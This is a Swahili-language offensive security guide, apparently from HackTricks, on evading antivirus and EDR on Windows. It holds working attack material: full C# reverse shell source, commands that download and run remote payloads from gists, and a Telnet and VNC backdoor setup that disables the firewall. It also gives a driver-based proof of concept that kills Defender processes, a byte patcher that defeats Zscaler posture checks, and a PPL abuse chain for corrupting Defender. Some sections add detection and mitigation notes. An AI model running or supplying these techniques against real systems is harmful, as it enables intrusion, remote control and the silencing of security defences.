- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza ku-obfuscate aina mbalimbali za pe files zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa LLVM-supported languages inayo tumia ROP (return-oriented programming). ROPfuscator ina-obfuscate program kwenye assembly code level kwa kubadilisha maelekezo ya kawaida kuwa ROP chains, ikizuia mtazamo wetu wa asili wa normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor ina uwezo wa kubadilisha EXE/DLL zilizopo kuwa shellcode kisha kuzizusha

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unapopakua baadhi ya executables kutoka kwenye intaneti na kuziendesha.

Microsoft Defender SmartScreen ni utaratibu wa usalama uliokusudiwa kuwalinda watumiaji dhidi ya kuendesha applications zinazoweza kuwa zenye madhara.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen huvutia kazi zaidi kwa njia ya reputation-based approach, ikimaanisha kwamba applications zisizozoeleka kupakuliwa zitachochea SmartScreen hivyo kutoa tahadhari na kuzuia mtumiaji kuendesha faili (hata hivyo faili bado inaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) kwa jina la Zone.Identifier inayoundwa moja kwa moja wakati wa kupakua faili kutoka intaneti, pamoja na URL kutoka ilipopakuliwa.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Ukaguzi wa Zone.Identifier ADS kwa faili iliyo pakuliwa kutoka intaneti.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kukumbuka kwamba executables zilizosainiwa kwa cheti cha saini kinachotambulika **hazitachochea SmartScreen**.

Njia yenye ufanisi mkubwa kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwa volumes zisizo za **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayopakiza payloads ndani ya output containers ili kuepuka Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hapa kuna demo ya kupita SmartScreen kwa kufunga payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni njia yenye nguvu ya kurekodi matukio katika Windows ambayo inaruhusu programu na sehemu za mfumo **kurekodi matukio**. Hata hivyo, pia inaweza kutumika na bidhaa za usalama kufuatilia na kugundua shughuli zilizo hatarishi.

Vivyo hivyo kama AMSI inavyoweza kuzimwa (kuepukwa), pia inawezekana kufanya kazi ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kurekodi matukio yoyote. Hii inafanywa kwa kubadili msimbo wa kazi hiyo katika memory ili irudi mara moja, kwa ufanisi kuzima urejeshaji wa kumbukumbu za ETW kwa mchakato huo.

Unaweza kupata taarifa zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Kupakia binaries za C# ndani ya memory imekuwa ikijulikana kwa muda mrefu na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja ndani ya memory bila kugusa disk, tutahitajika tu kuzingatia ku-patch AMSI kwa mchakato mzima.

Mengi ya C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari yanatoa uwezo wa kutekeleza C# assemblies moja kwa moja ndani ya memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inajumuisha **kutengeneza mchakato mpya wa dhabihu**, kuingiza msimbo wako wa hatari wa post-exploitation ndani ya mchakato huo mpya, kutekeleza msimbo huo na baada ya kumaliza, kuuawa mchakato mpya. Hii ina faida zake na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji hufanyika **outside** ya mchakato wetu wa Beacon implant. Hii inamaanisha kwamba ikiwa jambo katika hatua yetu ya post-exploitation linakwenda vibaya au linakamatwa, kuna **matarajio makubwa zaidi** ya **implant yetu kuishi.** Hasara ni kwamba kuna **uwezekano mkubwa** wa kukamatwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ni kuhusu kuingiza msimbo wa hatari wa post-exploitation **katika mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuupata skanning kwa AV, lakini hasara ni kwamba ikiwa kitu kitatokea vibaya kwa utekelezaji wa payload yako, kuna **matarajio makubwa zaidi** ya **kupoteza beacon yako** kwani inaweza kusababisha crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa unataka kusoma zaidi kuhusu kupakia C# Assembly, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo hatarishi kwa kutumia lugha nyingine kwa kumpa mashine iliyodhulumiwa upatikanaji **to the interpreter environment installed on the Attacker Controlled SMB share**.

Kwa kuruhusu upatikanaji wa Interpreter Binaries na mazingira kwenye SMB share unaweza **kutekeleza msimbo wowote katika lugha hizi ndani ya memory** ya mashine iliyodhulumiwa.

Repo inasema: Defender bado inachunguza scripts lakini kwa kutumia Go, Java, PHP n.k. tuna **urahisi zaidi wa kuepuka static signatures**. Vipimo kwa kutumia random un-obfuscated reverse shell scripts katika lugha hizi vimefanikiwa.

## TokenStomping

Token stomping ni técnica ambayo inamruhusu mshambuliaji **kubadilisha access token au bidhaa ya usalama kama EDR au AV**, kuongeza au kupunguza ruhusa ili mchakato usife lakini usiwe na idhini za kukagua shughuli hatarishi.

Ili kuzuia hili Windows inaweza **kuzuia michakato ya nje** kupata handles juu ya tokens za michakato ya usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi kusakinisha Chrome Remote Desktop kwenye kompyuta ya mwathiri na kisha kuitumia kunyakua udhibiti na kudumisha persistence:
1. Pakua kutoka https://remotedesktop.google.com/, bonyeza "Set up via SSH", na kisha bonyeza faili la MSI la Windows kupakua faili la MSI.
2. Endesha installer kwa kimya kwenye mwathiri (inahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na bonyeza next. Mwongozo utakuuliza kuidhinisha; bonyeza kitufe cha Authorize kuendelea.
4. Tekeleza parameter iliyopewa kwa marekebisho machache: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka param ya pin ambayo inaruhusu kuweka pin bila kutumia GUI).

## Advanced Evasion

Evasion ni mada tata sana; wakati mwingine lazima uzingatie vyanzo mbalimbali vya telemetry katika mfumo mmoja pekee, hivyo karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyoendelea.

Kila mazingira unayokabiliana nacho yatakuwa na nguvu na udhaifu wake wenyewe.

Ninakuhimiza uone hotuba hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate msingi wa mbinu zaidi za Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni hotuba nyingine nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Kale**

### **Angalia ni sehemu gani Defender inaona kuwa hatarishi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo ita**ondoa sehemu za binary** hadi itakapogundua ni sehemu gani **Defender** inaiona kuwa hatarishi na ikuitenganishe kwako.\
Zana nyingine inayofanya jambo **sawa** ni [**avred**](https://github.com/dobin/avred) na tovuti wazi inayotoa huduma hiyo katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo unaweza kuisakinisha (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fanya **ianze** wakati mfumo unapoanza na **endeshe** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (stealth) na zima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka bin downloads, sio setup)

**ON THE HOST**: Endesha _**winvnc.exe**_ na sanifu server:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Kisha, hamisha binari _**winvnc.exe**_ na **newly** created file _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

The attacker anapaswa kutekeleza ndani ya host yake binari `vncviewer.exe -listen 5900` ili itakuwa tayari kupokea reverse VNC connection. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Ili kudumisha stealth lazima usifanye mambo kadhaa

- Usianze `winvnc` ikiwa tayari inaendeshwa au utaamsha [popup](https://i.imgur.com/1SROTTl.png). Angalia kama inaendeshwa kwa kutumia `tasklist | findstr winvnc`
- Usianze `winvnc` bila `UltraVNC.ini` katika saraka moja au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usiendeshe `winvnc -h` kwa msaada au utaamsha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anzisha lister** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mlinzi wa sasa atasitisha mchakato haraka sana.**

### Kujenga reverse shell yetu

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Revershell ya Kwanza (C#)

Icompile kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na utekelezaji kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR kutoka Kernel Space

Storm-2603 ilitumia utility ndogo ya console inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kuangusha ransomware. Zana hii inaleta **driver yake yenye udhaifu lakini *imehifadhiwa kwa saini*** na kuuibua ili kutoa operations za kernel zilizo na ruhusa ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.

Mambo muhimu
1. **Signed driver**: Faili lililotumwa kwenye disk ni `ServiceMouse.sys`, lakini binary ni driver iliyosainiwa kisheria `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa sababu driver ina saini halali ya Microsoft, inalindwa kuingizwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unarejesha driver kama **kernel service** na wa pili unaianzisha ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD inakwepa kabisa ulinzi wa user-mode; code inayotekelezwa katika kernel inaweza kufungua processes zilizolindwa, kuziua, au kuingilia vitu vya kernel bila kuzingatia PPL/PP, ELAM au vipengele vingine vya hardening.

Ugonjwa / Kupunguza
•  Washa orodha ya madriver yenye udhaifu ya Microsoft (`HVCI`, `Smart App Control`) ili Windows ikatae kuingiza `AToolsKrnl64.sys`.
•  Fuata uundaji wa services mpya za *kernel* na toa tahadhari pale driver inapopakuliwa kutoka directory inayoweza kuandikwa na wote au ikiwa haipo kwenye allow-list.
•  Angalia kushikiliwa kwa user-mode kwa device objects maalum ikifuatiwa na simu za kushuku za `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** inaweka sheria za device-posture kiasili kwenye kifaa na inategemea Windows RPC kuwasilisha matokeo kwa vijenzi vingine. Chaguo mbili mbovu za muundo zinawezesha kuvuka kabisa:

1. Tathmini ya posture hufanyika **kila kikamilifu client-side** (boolean inatumwa kwa server).
2. Endpoints za ndani za RPC zinathibitisha tu kwamba executable inayounganisha **imehifadhiwa kwa saini na Zscaler** (kupitia `WinVerifyTrust`).

Kwa **kupatch binaries nne zilizohifadhiwa kwa saini kwenye disk** mbinu hizi zote mbili zinaweza kuzimwa:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Inarudisha daima `1` hivyo kila ukaguzi unakubalika |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za asili na kuanzisha upya service stack:

* **Zote** ukaguzi wa posture unaonyesha **kijani/kuendana**.
* Binaries zisizosainiwa au zilizorekebishwa zinaweza kufungua named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyovamiwa inapata ufikiaji usiozuiliwa wa mtandao wa ndani unaoelezewa na sera za Zscaler.

Utafiti wa kesi huu unaonyesha jinsi maamuzi ya kuamini upande wa mteja na ukaguzi rahisi wa saini yanavyoweza kushindwa kwa few byte patches.

## Kutumia vibaya Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) inatekeleza hierarchy ya signer/level ili tu protected processes zenye kiwango sawa au cha juu ziweze kufanyiana uharibifu. Kwa upande wa kushambulia, ikiwa unaweza kuanzisha kwa halali binary iliyo na PPL na kudhibiti hoja zake, unaweza kubadilisha utendakazi usio hatari (mfano, logging) kuwa uwezo wa kuandika uliodhibitiwa, unaoungwa mkono na PPL, dhidi ya saraka zilizolindwa zinazotumiwa na AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Msaidizi wa chanzo huria: CreateProcessAsPPL (huchagua kiwango cha ulinzi na hupitisha hoja kwa EXE lengwa):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Mfano wa matumizi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` hujizalisha mchakato mwenyewe na inakubali parameter ili kuandika faili ya log kwenye path iliyoainishwa na mwito.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- Orodhesha majina mafupi: `dir /x` kwenye kila directory ya mzazi.
- Pata njia fupi kwenye cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Anzisha the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pitisha hoja ya log-path ya ClipUp ili kulazimisha uundaji wa faili katika directory iliyo kwenye ulinzi wa AV (mfano, Defender Platform). Tumia majina mafupi ya 8.3 ikiwa inahitajika.
3) Ikiwa binary lengwa kwa kawaida hufunguliwa/imefungwa na AV wakati inapoendesha (mfano, MsMpEng.exe), panga uandishi kufanyika wakati wa boot kabla the AV starts kwa kusanidi auto-start service inayotekelezwa mapema kwa uhakika. Thibitisha mpangilio wa boot na Process Monitor (boot logging).
4) Katika reboot, the PPL-backed write hutokea kabla AV inafunga binaries zake, ukiharibu faili lengwa na kuzuia startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Huwezi kudhibiti yaliyomo ambayo ClipUp inaandika zaidi ya nafasi; primitive inafaa zaidi kwa uharibifu kuliko uingizaji sahihi wa maudhui.
- Inahitaji Local Administrator/SYSTEM ili kusanidi/kuanza service na dirisha la reboot.
- Muda ni muhimu: lengo halipaswi kuwa wazi; utekelezaji wakati wa boot unazuia file locks.

Detections
- Uundaji wa mchakato wa `ClipUp.exe` na hoja zisizo za kawaida, hasa ikiwa umeanzishwa na launchers zisizo za kawaida, karibu na boot.
- Services mpya zilizosanidiwa kuanza kiotomatiki binaries zenye kutiliwa shaka na kuanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/ubadilishaji wa service kabla ya kushindwa kwa startup ya Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye Defender binaries/Platform directories; uundaji/ubadilishaji wa faili usiotarajiwa na michakato yenye protected-process flags.
- ETW/EDR telemetry: tafuta michakato iliyoundwa na `CREATE_PROTECTED_PROCESS` na matumizi isiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Mitigations
- WDAC/Code Integrity: zuia ni signed binaries zipi zinaweza kuendesha kama PPL na bajo mpangavyo wawapishi; zuia kuitwa kwa ClipUp nje ya muktadha halali.
- Service hygiene: zuia uundaji/ubadilishaji wa services za auto-start na fuatilia uchezaji wa mpangilio wa kuanza.
- Hakikisha Defender tamper protection na early-launch protections zimewezeshwa; chunguza makosa ya startup yanayoashiria uharibifu wa binary.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazohifadhi security tooling ikiwa inafaa kwa mazingira yako (jaribu kwa kina).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender huchagua platformi kutoka anayoendesha kwa kuorodhesha subfolders chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Inachagua subfolder yenye string ya toleo la juu kwa mpangilio wa leksikografiki (mf., `4.18.25070.5-0`), kisha inaanzisha Defender service processes kutoka hapo (ikibadilisha service/registry paths ipasavyo). Uteuzi huu unaegemea directory entries ikiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuielekeza Defender kwa njia inayoweza kuandikwa na mshambuliaji na kufanikisha DLL sideloading au service disruption.

Preconditions
- Local Administrator (inahitajika kuunda directories/symlinks chini ya Platform folder)
